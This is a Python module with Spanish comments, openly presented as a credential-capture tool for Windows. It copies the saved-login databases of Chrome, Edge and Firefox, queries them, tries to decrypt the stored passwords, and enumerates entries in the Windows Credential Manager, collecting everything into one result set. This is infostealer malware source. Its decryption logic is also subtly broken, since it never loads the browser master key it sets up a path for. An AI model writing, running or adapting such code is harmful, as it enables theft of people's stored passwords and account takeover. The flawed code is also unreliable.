"""
Módulo de captura de credenciales.
Permite extraer credenciales de procesos y navegadores web.
"""

import os
import json
import base64
import sqlite3
import shutil
import platform
import logging
import subprocess
from typing import List, Dict, Optional, Union
import tempfile
import ctypes
import ctypes.wintypes
from Cryptodome.Cipher import AES

class CryptoAPI:
    """Clase para manejar el cifrado/descifrado usando DPAPI de Windows."""
    def __init__(self):
        self.cryptunprotect_data = ctypes.windll.crypt32.CryptUnprotectData
        self.cryptunprotect_data.argtypes = [
            ctypes.POINTER(self._DATA_BLOB),
            ctypes.POINTER(ctypes.wintypes.LPWSTR),
            ctypes.POINTER(self._DATA_BLOB),
            ctypes.c_void_p,
            ctypes.POINTER(self._CRYPTPROTECT_PROMPTSTRUCT),
            ctypes.wintypes.DWORD,
            ctypes.POINTER(self._DATA_BLOB)
        ]
        self.cryptunprotect_data.restype = ctypes.wintypes.BOOL
        
    class _DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ('cbData', ctypes.wintypes.DWORD),
            ('pbData', ctypes.POINTER(ctypes.c_char))
        ]

    class _CRYPTPROTECT_PROMPTSTRUCT(ctypes.Structure):
        _fields_ = [
            ('cbSize', ctypes.wintypes.DWORD),
            ('dwPromptFlags', ctypes.wintypes.DWORD),
            ('hwndApp', ctypes.wintypes.HWND),
            ('szPrompt', ctypes.POINTER(ctypes.wintypes.WCHAR))
        ]

    def unprotect(self, encrypted: bytes) -> bytes:
        """Descifra datos usando DPAPI."""
        input_blob = self._DATA_BLOB()
        input_blob.cbData = len(encrypted)
        input_blob.pbData = ctypes.cast(encrypted, ctypes.POINTER(ctypes.c_char))
        
        output_blob = self._DATA_BLOB()
        
        if self.cryptunprotect_data(
            ctypes.byref(input_blob),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(output_blob)
        ):
            data = ctypes.string_at(output_blob.pbData, output_blob.cbData)
            ctypes.windll.kernel32.LocalFree(output_blob.pbData)
            return data
        raise Exception("Failed to decrypt data")

class CredentialCapture:
    def __init__(self):
        """Inicializa el capturador de credenciales."""
        self.system = platform.system().lower()
        self.temp_dir = tempfile.mkdtemp()
        self.crypto = CryptoAPI() if self.system == "windows" else None
        self.results: Dict[str, List[Dict[str, str]]] = {
            "chrome": [],
            "firefox": [],
            "edge": [],
            "system": []
        }

    def _decrypt_password(self, encrypted_pass: bytes) -> str:
        """Descifra una contraseña usando DPAPI y AES-GCM."""
        try:
            # Extraer el vector de inicialización y el payload
            iv = encrypted_pass[3:15]
            payload = encrypted_pass[15:]
            
            # Descifrar la clave maestra usando DPAPI
            cipher = AES.new(self.crypto.unprotect(payload), AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode()
        except Exception as e:
            logging.debug(f"Error descifrando contraseña: {e}")
            return ""

    def capture_chrome_passwords(self) -> List[Dict[str, str]]:
        """Captura credenciales almacenadas en Chrome."""
        try:
            if self.system != "windows":
                return []
                
            local_state_path = os.path.join(
                os.environ["USERPROFILE"],
                "AppData", "Local", "Google", "Chrome",
                "User Data", "Local State"
            )
            
            login_db_path = os.path.join(
                os.environ["USERPROFILE"],
                "AppData", "Local", "Google", "Chrome",
                "User Data", "Default", "Login Data"
            )
            
            # Copiar base de datos a temporal
            temp_db = os.path.join(self.temp_dir, "chrome_login.db")
            shutil.copy2(login_db_path, temp_db)
            
            credentials = []
            with sqlite3.connect(temp_db) as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )
                
                for url, username, encrypted_pass in cursor.fetchall():
                    try:
                        password = self._decrypt_password(encrypted_pass)
                        if password:
                            credentials.append({
                                "url": url,
                                "username": username,
                                "password": password
                            })
                    except Exception as e:
                        logging.debug(f"Error procesando credencial: {e}")
                        continue
                        
            return credentials
            
        except Exception as e:
            logging.error(f"Error capturando credenciales de Chrome: {e}")
            return []
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def capture_firefox_passwords(self) -> List[Dict[str, str]]:
        """
        Captura credenciales almacenadas en Firefox.
        
        Returns:
            Lista de credenciales encontradas
        """
        try:
            if self.system != "windows":
                return []
                
            profiles_path = os.path.join(
                os.environ["APPDATA"],
                "Mozilla", "Firefox", "Profiles"
            )
            
            credentials = []
            for profile in os.listdir(profiles_path):
                db_path = os.path.join(profiles_path, profile, "logins.json")
                if not os.path.exists(db_path):
                    continue
                    
                # Copiar archivo a temporal
                temp_json = os.path.join(self.temp_dir, "firefox_logins.json")
                shutil.copy2(db_path, temp_json)
                
                try:
                    with open(temp_json, "r", encoding="utf-8") as f:
                        logins = json.load(f)
                        
                    for login in logins.get("logins", []):
                        try:
                            credentials.append({
                                "url": login.get("hostname", ""),
                                "username": login.get("encryptedUsername", ""),
                                "password": login.get("encryptedPassword", "")
                            })
                        except:
                            continue
                            
                except Exception as e:
                    logging.debug(f"Error leyendo perfil Firefox: {e}")
                    continue
                finally:
                    try:
                        os.remove(temp_json)
                    except:
                        pass
                        
            return credentials
            
        except Exception as e:
            logging.error(f"Error capturando credenciales de Firefox: {e}")
            return []

    def capture_edge_passwords(self) -> List[Dict[str, str]]:
        """
        Captura credenciales almacenadas en Edge.
        
        Returns:
            Lista de credenciales encontradas
        """
        try:
            if self.system != "windows":
                return []
                
            local_state_path = os.path.join(
                os.environ["LOCALAPPDATA"],
                "Microsoft", "Edge", "User Data", "Local State"
            )
            
            login_db_path = os.path.join(
                os.environ["LOCALAPPDATA"],
                "Microsoft", "Edge", "User Data", "Default", "Login Data"
            )
            
            # El resto del proceso es similar a Chrome
            temp_db = os.path.join(self.temp_dir, "edge_login.db")
            shutil.copy2(login_db_path, temp_db)
            
            credentials = []
            with sqlite3.connect(temp_db) as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )
                
                for url, username, encrypted_pass in cursor.fetchall():
                    try:
                        password = self._decrypt_password(encrypted_pass)
                        if password:
                            credentials.append({
                                "url": url,
                                "username": username,
                                "password": password
                            })
                    except Exception as e:
                        logging.debug(f"Error procesando credencial: {e}")
                        continue
                        
            return credentials
            
        except Exception as e:
            logging.error(f"Error capturando credenciales de Edge: {e}")
            return []
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def capture_system_credentials(self) -> List[Dict[str, str]]:
        """
        Captura credenciales almacenadas en el sistema.
        
        Returns:
            Lista de credenciales encontradas
        """
        try:
            if self.system != "windows":
                return []

            CRED_TYPE_GENERIC = 1
            CRED_TYPE_DOMAIN_PASSWORD = 2
            CRED_TYPE_DOMAIN_CERTIFICATE = 3
            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4

            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW
            CredFree = ctypes.windll.advapi32.CredFree

            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):
                _fields_ = [
                    ('Keyword', ctypes.wintypes.LPWSTR),
                    ('Flags', ctypes.wintypes.DWORD),
                    ('ValueSize', ctypes.wintypes.DWORD),
                    ('Value', ctypes.wintypes.LPBYTE)
                ]

            class CREDENTIAL(ctypes.Structure):
                _fields_ = [
                    ('Flags', ctypes.wintypes.DWORD),
                    ('Type', ctypes.wintypes.DWORD),
                    ('TargetName', ctypes.wintypes.LPWSTR),
                    ('Comment', ctypes.wintypes.LPWSTR),
                    ('LastWritten', ctypes.wintypes.FILETIME),
                    ('CredentialBlobSize', ctypes.wintypes.DWORD),
                    ('CredentialBlob', ctypes.wintypes.LPBYTE),
                    ('Persist', ctypes.wintypes.DWORD),
                    ('AttributeCount', ctypes.wintypes.DWORD),
                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),
                    ('TargetAlias', ctypes.wintypes.LPWSTR),
                    ('UserName', ctypes.wintypes.LPWSTR)
                ]

            count = ctypes.wintypes.DWORD()
            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()

            credentials = []
            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):
                for i in range(count.value):
                    cred = creds[i].contents
                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:
                        try:
                            credentials.append({
                                "target": cred.TargetName,
                                "username": cred.UserName,
                                "type": "Generic" if cred.Type == CRED_TYPE_GENERIC else "Domain",
                                "blob_size": cred.CredentialBlobSize
                            })
                        except:
                            continue

                CredFree(creds)
                
            return credentials
            
        except Exception as e:
            logging.error(f"Error capturando credenciales del sistema: {e}")
            return []

    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:
        """
        Captura todas las credenciales disponibles.
        
        Returns:
            Dict con todas las credenciales encontradas
        """
        try:
            self.results["chrome"] = self.capture_chrome_passwords()
            self.results["firefox"] = self.capture_firefox_passwords()
            self.results["edge"] = self.capture_edge_passwords()
            self.results["system"] = self.capture_system_credentials()
            return self.results
        finally:
            self.cleanup()

    def cleanup(self):
        """Limpia archivos temporales."""
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
